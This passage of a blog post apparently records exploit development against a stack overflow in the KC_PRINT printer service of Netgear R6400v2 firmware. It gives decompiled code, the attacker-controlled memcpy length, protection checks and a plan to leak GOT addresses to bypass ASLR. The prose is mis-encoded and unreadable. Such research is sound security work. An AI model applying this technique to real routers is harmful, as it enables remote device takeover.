å³å¯ã€‚ </p><p>å¦å¤–ï¼Œ åœ¨ <code>do_http</code> å‡½æ•°ä¸­æœ‰ä¸€ä¸ª <code>  if ( !is_printer_connected(usblp_index) )     // æ£€æŸ¥æ˜¯å¦æœ‰æ‰“å°æœºè®¾å¤‡æŒ‚è½½</code> çš„åˆ¤æ–­ï¼Œè¯¥å‡½æ•°ä¼šè¯»å– <code>/proc/printer_status</code> çš„å†…å®¹æ¥åˆ¤æ–­æ˜¯å¦æœ‰æ‰“å°æœºæŒ‚è½½ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( printer_status )</span><br><span class="line">&#123;</span><br><span class="line">  fd = open(<span class="string">&quot;/proc/printer_status&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(printer_status, <span class="number">0</span>, <span class="number">0x400</span>u);</span><br><span class="line">    v7 = read(fd, printer_status, <span class="number">0x400</span>u);</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">if</span> ( v7 &gt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(printer_status + v7) = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">      <span class="built_in">snprintf</span>(s, <span class="number">0x10</span>u, <span class="string">&quot;usblp%d&quot;</span>, usblp_index - <span class="number">1</span>);</span><br><span class="line">      v7 = <span class="built_in">strstr</span>(printer_status, s) != <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">free</span>(printer_status);</span><br><span class="line">      printer_status = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> v7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      ...</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘æ²¡æœ‰æŒ‚è½½æ‰“å°æœºï¼Œå› æ­¤æˆ‘é€šè¿‡ gdb æ¥ç»•è¿‡è¿™ä¸ªåˆ¤æ–­ã€‚</p><p>æ­¤æ—¶å·²ç»è¿›åˆ° <code>do_airippWithContentLength</code> å‡½æ•°ï¼Œ  è¯¥å‡½æ•°ä¼šè¿›ä¸€æ­¥æ ¹æ® <code>content-len - 8</code>  è¯»å–åç»­çš„æ›´å¤šæ¶ˆæ¯å†…å®¹ã€‚è€Œè¿™ä¸ª <code>content-len</code>  æ˜¯æ²¡æœ‰è¿›è¡Œé•¿åº¦æ£€æŸ¥çš„ï¼Œè¿™é‡Œä»¥ <code>Response_Get_Jobs</code> å‡½æ•°ä¸ºä¾‹ï¼Œ æ¥åšè¿›ä¸€æ­¥çš„åˆ†æã€‚</p><p>åœ¨ <code>Response_Get_Jobs</code> ä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">flag1 = <span class="number">0</span>;</span><br><span class="line"> prefix_size = <span class="number">0x4A</span>;</span><br><span class="line"> prefix_ptr = <span class="built_in">malloc</span>(<span class="number">0x4A</span>u);</span><br><span class="line"> <span class="keyword">if</span> ( !prefix_ptr )</span><br><span class="line"> &#123;</span><br><span class="line">   perror(<span class="string">&quot;Response_Get_Jobs: malloc xx&quot;</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="built_in">memset</span>(prefix_ptr, <span class="number">0</span>, prefix_size);</span><br><span class="line"> cnt = memcpy_n(prefix_ptr, total, &amp;recv_buf[offset], <span class="number">2u</span>);</span><br><span class="line"> total += cnt;</span><br><span class="line"> <span class="keyword">if</span> ( *recv_buf == <span class="number">1</span> &amp;&amp; !recv_buf[<span class="number">1</span>] )</span><br><span class="line">   flag1 = <span class="number">1</span>;</span><br><span class="line"> offset += <span class="number">2</span>;</span><br><span class="line"> *(prefix_ptr + total++) = <span class="number">0</span>;</span><br><span class="line"> *(prefix_ptr + total++) = <span class="number">0</span>;</span><br><span class="line"> offset += <span class="number">2</span>;</span><br><span class="line"> total += memcpy_n(prefix_ptr, total, &amp;recv_buf[offset], <span class="number">4u</span>);</span><br><span class="line"> offset += <span class="number">4</span>;</span><br><span class="line"> v12 = <span class="number">66</span>;</span><br><span class="line"> cnt = memcpy_n(prefix_ptr, total, &amp;unk_1823C, <span class="number">0x42</span>u);</span><br><span class="line"> total += cnt;</span><br><span class="line"> ++offset;                                     <span class="comment">// offest == 09</span></span><br><span class="line"> <span class="built_in">memset</span>(v9, <span class="number">0</span>, <span class="keyword">sizeof</span>(v9));</span><br><span class="line"> <span class="built_in">memset</span>(buf_2048, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf_2048));</span><br><span class="line"> buf_2048[subffix_offset++] = <span class="number">5</span>;</span><br><span class="line"> <span class="keyword">if</span> ( !flag1 )</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="keyword">while</span> ( recv_buf[offset] != <span class="number">3</span> &amp;&amp; offset &lt;= content_len )</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">if</span> ( recv_buf[offset] == <span class="number">0x44</span> &amp;&amp; !flag2 )</span><br><span class="line">     &#123;</span><br><span class="line">       flag2 = <span class="number">1</span>;</span><br><span class="line">       buf_2048[subffix_offset++] = <span class="number">68</span>;</span><br><span class="line">       copy_len = (recv_buf[offset + <span class="number">1</span>] &lt;&lt; <span class="number">8</span>) + recv_buf[offset + <span class="number">2</span>];</span><br><span class="line">       cnt = memcpy_n(buf_2048, subffix_offset, &amp;recv_buf[offset + <span class="number">1</span>], copy_len + <span class="number">2</span>);</span><br><span class="line">       subffix_offset += cnt;</span><br><span class="line">     &#125;</span><br><span class="line">     ++offset;                                 <span class="comment">// offset=10</span></span><br><span class="line">     copy_len = (recv_buf[offset] &lt;&lt; <span class="number">8</span>) + recv_buf[offset + <span class="number">1</span>];</span><br><span class="line">     offset += <span class="number">2</span> + copy_len;                   <span class="comment">// offset 12</span></span><br><span class="line">     copy_len = (recv_buf[offset] &lt;&lt; <span class="number">8</span>) + recv_buf[offset + <span class="number">1</span>];</span><br><span class="line">     offset += <span class="number">2</span>;                              <span class="comment">// offset 14</span></span><br><span class="line">     <span class="keyword">if</span> ( flag2 )</span><br><span class="line">     &#123;</span><br><span class="line">       <span class="built_in">memset</span>(command, <span class="number">0</span>, <span class="keyword">sizeof</span>(command));</span><br><span class="line">       <span class="built_in">memcpy</span>(command, &amp;recv_buf[offset], copy_len);</span><br><span class="line">       <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(command, <span class="string">&quot;job-media-sheets-completed&quot;</span>) )</span><br></pre></td></tr></table></figure><p>å­˜åœ¨ä¸€ä¸ªç¼“å†²åŒºæº¢å‡ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( flag2 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memset</span>(command, <span class="number">0</span>, <span class="keyword">sizeof</span>(command));</span><br><span class="line">  <span class="built_in">memcpy</span>(command, &amp;recv_buf[offset], copy_len);</span><br></pre></td></tr></table></figure><p>æ­¤å¤„çš„ <code>copy_len</code>  æ˜¯å®Œå…¨å¯æ§çš„ï¼Œ ä¸” <code>buf_2048</code>   åœ¨æ ˆä¸Šï¼Œ æˆ‘ä»¬åªéœ€è®© <code>flag1</code>  ä¸ç­‰äº1 ï¼Œ <code>flag2</code> ç­‰äº 1 ï¼Œå°±èƒ½è¿›å…¥åˆ°è¿™ä¸ªåˆ†æ”¯ï¼Œ å³æ»¡è¶³  <code> *recv_buf == 1 &amp;&amp; !recv_buf[1]</code> ä¸” <code> recv_buf[offset] == 0x44</code> æ¡ä»¶å³å¯ã€‚</p><h2 id="åˆ©ç”¨ç¼–å†™"><a href="#åˆ©ç”¨ç¼–å†™" class="headerlink" title="åˆ©ç”¨ç¼–å†™"></a>åˆ©ç”¨ç¼–å†™</h2><p>è¯¥ç¨‹åºä¿æŠ¤éƒ½æ²¡æœ‰å¼€å¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; checksec</span><br><span class="line">[*] <span class="string">&#x27;/workhub/Dropbox/Attachments/IoT and BaseBand/Router/Netgear/R6400v2/fs/squashfs-root/usr/bin/KC_PRINT&#x27;</span></span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8000)</span><br><span class="line"></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>æ—¢æ²¡æœ‰ <code>canary</code>  ä¹Ÿæ²¡æœ‰ <code>PIE</code> ï¼Œ è¿™æå¤§çš„æ–¹ä¾¿äº†æˆ‘ä»¬çš„æ¼æ´åˆ©ç”¨ã€‚  </p><p>ç³»ç»ŸéšæœºåŒ–å¼€å¯æƒ…å†µï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat /proc/sys/kernel/randomize_va_space</span></span><br><span class="line">1</span><br></pre></td></tr></table></figure><p><code>ASLR</code> ç­‰çº§ä¸º 1ï¼Œ å³æ ˆå’Œå…±äº«åº“æ˜¯å®Œå…¨éšæœºçš„ï¼Œ ä½†æ˜¯å †çš„åˆ†é…ä¸éšæœºã€‚</p><p>æˆ‘ä»¬çš„ç›®çš„æ˜¯é€šè¿‡è¿™ä¸ªæ ˆæº¢å‡ºæ¼æ´ï¼Œ æ¥è¾¾åˆ°ä»»æ„å‘½ä»¤æ‰§è¡Œçš„ç›®çš„ã€‚æˆ‘ä»¬æ£€ç´¢è¿™ä¸ªç¨‹åºï¼Œå‘ç°ç¨‹åºé‡Œå¹¶æ²¡æœ‰ç°æˆçš„ <code>system</code> æˆ–è€… <code>popen</code> å‡½æ•°ï¼Œå› æ­¤ <code>ret2system</code> çš„æ–¹æ³•å¹¶ä¸èƒ½ç›´æ¥ä½¿ç”¨ï¼Œ å› æ­¤æˆ‘ä»¬éœ€è¦ç»•è¿‡éšæœºåŒ–ï¼Œéœ€è¦æ³„æ¼ <code>uclibc</code> ä¸­çš„ <code>system</code> åœ°å€ï¼Œ å› æ­¤é¦–å…ˆéœ€è¦ä¸€ä¸ªä¿¡æ¯æ³„æ¼çš„æ–¹æ³•ï¼Œæ¥ leak <code>uclibc </code> çš„åŠ è½½åŸºå€ã€‚</p><h3 id="Bypass-ASLR"><a href="#Bypass-ASLR" class="headerlink" title="Bypass ASLR"></a>Bypass ASLR</h3><p>å…¶å®ä¸€èˆ¬è¿™ç§æ€è·¯ï¼Œ æˆ‘ä»¬å¯ä»¥é€šè¿‡ ROP ï¼Œ è°ƒç”¨ <code>write</code> ç­‰å‡½æ•°è¯»å–  <code>got</code> è¡¨ä¸­çš„å€¼æ¥åš <code>uclibc </code>çš„åœ°å€ã€‚ ä½†æ˜¯è¿™ä¸ªæ–¹æ³•æˆ‘ä»¬å¯èƒ½éœ€è¦çŸ¥é“æˆ‘ä»¬å½“å‰é“¾æ¥çš„ <code>fd</code> ã€‚å¦‚æœä¸çŸ¥é“ <code>fd</code> ï¼Œ æˆ‘ä»¬å¯èƒ½éœ€è¦çˆ†ç ´è¿™ä¸ªï¼Œ ä½†ç”±äºè¿™ä¸ªç¨‹åºæ˜¯å¤šçº¿ç¨‹è€Œä¸æ˜¯çˆ¶å­è¿›ç¨‹çš„å½¢å¼ï¼Œ å¦‚æœå¤±è´¥å¯èƒ½ä¼šé€ æˆ crashã€‚ </p><p>è¿›ä¸€æ­¥åˆ†æå‡½æ•°ï¼Œ ä»¥åŠé˜…è¯» slide  ï¼Œæˆ‘ä»¬å‘ç°ç¨‹åºä¸­æœ‰ä¸€ä¸ªå¯ä»¥åšä»»æ„åœ°å€è¯»å†™çš„æ–¹æ³•ã€‚</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-763f460331a41355beb24dcb1b383c47-159298.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-763f460331a41355beb24dcb1b383c47-159298.png"></a></p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡æ ˆæº¢å‡ºï¼Œ æ¥è¦†ç›– <code>prefix_ptr</code>  å’Œ <code>prefix_size </code> é€šè¿‡æ§åˆ¶è¿™ä¸¤ä¸ªå˜é‡ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€š <code>write_ipp_response</code>  å°†æˆ‘ä»¬æƒ³è¯»å–çš„å†…å®¹å‘é€å›æ¥ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> command[<span class="number">64</span>]; <span class="comment">// [sp+24h] [bp-1090h] BYREF</span></span><br><span class="line"><span class="keyword">char</span> buf_2048[<span class="number">2048</span>]; <span class="comment">// [sp+64h] [bp-1050h] BYREF</span></span><br><span class="line"><span class="keyword">char</span> v9[<span class="number">2048</span>]; <span class="comment">// [sp+864h] [bp-850h] BYREF</span></span><br><span class="line"><span class="keyword">int</span> v10; <span class="comment">// [sp+1064h] [bp-50h]</span></span><br><span class="line"><span class="keyword">size_t</span> copy_len; <span class="comment">// [sp+1068h] [bp-4Ch]</span></span><br><span class="line"><span class="keyword">int</span> v12; <span class="comment">// [sp+106Ch] [bp-48h]</span></span><br><span class="line"><span class="keyword">size_t</span> cnt; <span class="comment">// [sp+1070h] [bp-44h]</span></span><br><span class="line"><span class="keyword">size_t</span> prefix_size; <span class="comment">// [sp+1074h] [bp-40h]</span></span><br><span class="line"><span class="keyword">int</span> total; <span class="comment">// [sp+1078h] [bp-3Ch]</span></span><br><span class="line"><span class="keyword">void</span> *prefix_ptr; <span class="comment">// [sp+107Ch] [bp-38h]</span></span><br><span class="line"><span class="keyword">int</span> v17; <span class="comment">// [sp+1080h] [bp-34h]</span></span><br><span class="line"><span class="keyword">int</span> client_sock; <span class="comment">// [sp+1084h] [bp-30h]</span></span><br><span class="line"><span class="keyword">int</span> v19; <span class="comment">// [sp+1088h] [bp-2Ch]</span></span><br><span class="line"><span class="keyword">int</span> v20; <span class="comment">// [sp+108Ch] [bp-28h]</span></span><br><span class="line"><span class="keyword">char</span> flag1; <span class="comment">// [sp+1093h] [bp-21h]</span></span><br><span class="line"><span class="keyword">char</span> v22; <span class="comment">// [sp+1094h] [bp-20h]</span></span><br><span class="line"><span class="keyword">char</span> job_state_resons; <span class="comment">// [sp+1095h] [bp-1Fh]</span></span><br><span class="line"><span class="keyword">char</span> job_state; <span class="comment">// [sp+1096h] [bp-1Eh]</span></span><br><span class="line"><span class="keyword">char</span> job_originating_user_name; <span class="comment">// [sp+1097h] [bp-1Dh]</span></span><br><span class="line"><span class="keyword">char</span> job_name; <span class="comment">// [sp+1098h] [bp-1Ch]</span></span><br><span class="line"><span class="keyword">char</span> job_id; <span class="comment">// [sp+1099h] [bp-1Bh]</span></span><br><span class="line"><span class="keyword">char</span> v28; <span class="comment">// [sp+109Ah] [bp-1Ah]</span></span><br><span class="line"><span class="keyword">char</span> flag2; <span class="comment">// [sp+109Bh] [bp-19h]</span></span><br><span class="line"><span class="keyword">size_t</span> final_size; <span class="comment">// [sp+109Ch] [bp-18h]</span></span><br><span class="line"><span class="keyword">int</span> offset; <span class="comment">// [sp+10A0h] [bp-14h]</span></span><br><span class="line"><span class="keyword">size_t</span> response_len; <span class="comment">// [sp+10A4h] [bp-10h]</span></span><br><span class="line"><span class="keyword">void</span> *final_ptr; <span class="comment">// [sp+10A8h] [bp-Ch]</span></span><br><span class="line"><span class="keyword">size_t</span> subffix_offset; <span class="comment">// [sp+10ACh] [bp-8h]</span></span><br></pre></td></tr></table></figure><p>æœ€é¦–å…ˆçš„æƒ³æ³•è‚¯å®šæ˜¯é€šè¿‡è¦†ç›– <code>prefix_ptr</code> æŒ‡å‘ <code>.got</code>  æ¥åšè¯»å†™ï¼Œ ä½†æ˜¯å¦‚æœæˆ‘ä»¬ç›´æ¥çš„æŒ‡å‘äº†å‡½æ•°çš„ <code>.got</code>  , ä¾‹å¦‚ <code>strcpy_ptr</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.got:<span class="number">000180F</span>0 strcpy_ptr      DCD __imp_strcpy        ; DATA XREF: <span class="built_in">strcpy</span>+<span class="number">8</span></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯åœ¨è°ƒç”¨ <code>write_ipp_response</code> åï¼Œ ç¨‹åºä¼š <code>free(prefix_ptr);</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">v10 = write_ipp_response(client_sock, final_ptr, response_len);</span><br><span class="line"><span class="keyword">if</span> ( prefix_ptr )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>(prefix_ptr);</span><br><span class="line">  prefix_ptr = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœæ˜¯ç›´æ¥æ§åˆ¶  <code>prefix_ptr == 000180F0</code> ï¼Œ åœ¨ <code>free</code> çš„è¿‡ç¨‹ä¸­ä¼šé€ æˆå´©æºƒã€‚ æœ€åæˆ‘ä»¬å‘ç°å½“æŠŠ <code>prefix_ptr </code> æŒ‡å‘ <code>.got</code>  çš„å¼€å¤´</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.got:<span class="number">000180E4</span>                                         ; sub_8C0C+<span class="number">8</span>â†‘o ...</span><br><span class="line">.got:<span class="number">000180E8</span>                 DCD <span class="number">0</span></span><br><span class="line">.got:<span class="number">000180</span>EC off_180EC       DCD <span class="number">0</span>                   ; DATA XREF: sub_8C0C+Câ†‘r</span><br><span class="line">.got:<span class="number">000180F</span>0 strcpy_ptr      DCD __imp_strcpy        ; DATA XREF: <span class="built_in">strcpy</span>+<span class="number">8</span>â†‘r</span><br></pre></td></tr></table></figure><p>å³å°† <code>prefix_ptr</code> æŒ‡å‘  <code>000180E4</code>  æ˜¯ä¸ä¼šå´©æºƒçš„ã€‚</p><blockquote><p>è¿™é‡Œå’Œ å°ä¼™ä¼´  @aobo @leomxxj è®¨è®ºæ¥ä¸‹ ï¼Œ çŒœæµ‹åº”è¯¥æ˜¯å¦‚æœæ˜¯ free(0x000180EC) ï¼Œ å½“ uclibc ä¼šå¯¹  libc çš„åœ°å€å†™ï¼Œ é€ æˆ crash<br>å¦‚æœ free(0x00180E4) </p><p>pwndbg&gt; telescope 0x000180E4<br>    00:0000â”‚  0x180e4 â€”â–¸ 0x1800c â—‚â€” 0x1<br>    01:0004â”‚  0x180e8 â€”â–¸ 0x40024030 â—‚â€” 0x0<br>pwndbg&gt; vmmap 0x1800c<br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br> 0x18000    0x19000 rw-p     1000 10000  /usr/bin/KC_PRINT +0xc<br>0x1800c åœ°å€æ˜¯å¯è¯»å†™çš„</p></blockquote><p>å¦å¤–åœ¨ç¼–å†™è¿™éƒ¨åˆ† exploit çš„æ—¶å€™ï¼Œ æˆ‘ä»¬å‘ç°å¤„ç† <code>recv_buf</code> æ¶ˆæ¯çš„æ—¶å€™</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !flag1 )</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="keyword">while</span> ( recv_buf[offset] != <span class="number">3</span> &amp;&amp; offset &lt;= content_len )</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">if</span> ( recv_buf[offset] == <span class="number">0x44</span> &amp;&amp; !flag2 )</span><br><span class="line">     &#123;</span><br></pre></td></tr></table></figure><p>è¿™éƒ¨åˆ†æ˜¯ä¸€ä¸ª <code>while</code> å¾ªç¯ï¼Œåªæœ‰å½“æ¶ˆæ¯ä¸º <code>\x03</code> çš„æ—¶å€™ï¼Œ æ‰ä¼šç»“æŸå¾ªç¯ï¼Œ å› æ­¤æˆ‘ä»¬éœ€è¦ <code>offset</code>  è®¾ç½®å¥½ï¼Œ </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    offset += copy_len;</span><br><span class="line">.text:<span class="number">00010</span>A30                 LDR             R2, [R11,<span class="meta">#offset]</span></span><br><span class="line">.text:<span class="number">00010</span>A34                 LDR             R3, [R11,#copy_len]</span><br><span class="line">.text:<span class="number">00010</span>A38                 ADD             R3, R2, R3</span><br><span class="line">.text:<span class="number">00010</span>A3C                 STR             R3, [R11,#<span class="number">-0x14</span>]</span><br></pre></td></tr></table></figure><p>ç»“æŸå¾ªç¯åˆ° <code>write_ipp_response</code> å‡½æ•°ä¹‹å‰ ï¼Œæˆ‘ä»¬è¿˜éœ€è¦è¿‡ä¸¤ä¸ªåœ°æ–¹ï¼Œ ç¬¬ä¸€ä¸ªå¤„ï¼Œ ä¸ºäº†æ–¹ä¾¿æˆ‘ä»¬åœ¨ <code>command</code>  å‰è®¾ç½®ä¸€ä¸ª <code>job-id</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">    offset += <span class="number">2</span>;                              <span class="comment">// offset 14</span></span><br><span class="line">    <span class="keyword">if</span> ( flag2 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memset</span>(command, <span class="number">0</span>, <span class="keyword">sizeof</span>(command));</span><br><span class="line">      <span class="built_in">memcpy</span>(command, &amp;recv_buf[offset], copy_len);</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(command, <span class="string">&quot;job-media-sheets-completed&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v22 = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(command, <span class="string">&quot;job-state-reasons&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        job_state_resons = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(command, <span class="string">&quot;job-name&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        job_name = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(command, <span class="string">&quot;job-originating-user-name&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        job_originating_user_name = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(command, <span class="string">&quot;job-state&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        job_state = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(command, <span class="string">&quot;job-id&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        job_id = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v28 )</span><br><span class="line">        &#123;</span><br><span class="line">          buf_2048[subffix_offset++] = <span class="number">68</span>;</span><br><span class="line">          buf_2048[subffix_offset++] = <span class="number">0</span>;</span><br><span class="line">          buf_2048[subffix_offset++] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cnt = memcpy_n(buf_2048, subffix_offset, &amp;recv_buf[offset - <span class="number">2</span>], copy_len + <span class="number">2</span>);</span><br><span class="line">        subffix_offset += cnt;</span><br><span class="line">        v28 = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    offset += copy_len;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">final_size += prefix_size;</span><br><span class="line"><span class="keyword">if</span> ( flag1 )</span><br><span class="line">  v20 = sub_11D68(v17, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, v9);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  v20 = sub_11D68(v17, job_id, job_name, job_originating_user_name, job_state, job_state_resons, v22, v9);</span><br><span class="line"><span class="keyword">if</span> ( v20 &gt; <span class="number">0</span> )</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒå¤„ <code>final_ptr = malloc(++final_size);</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">LABEL_54:</span><br><span class="line">    *(final_ptr + response_len++) = <span 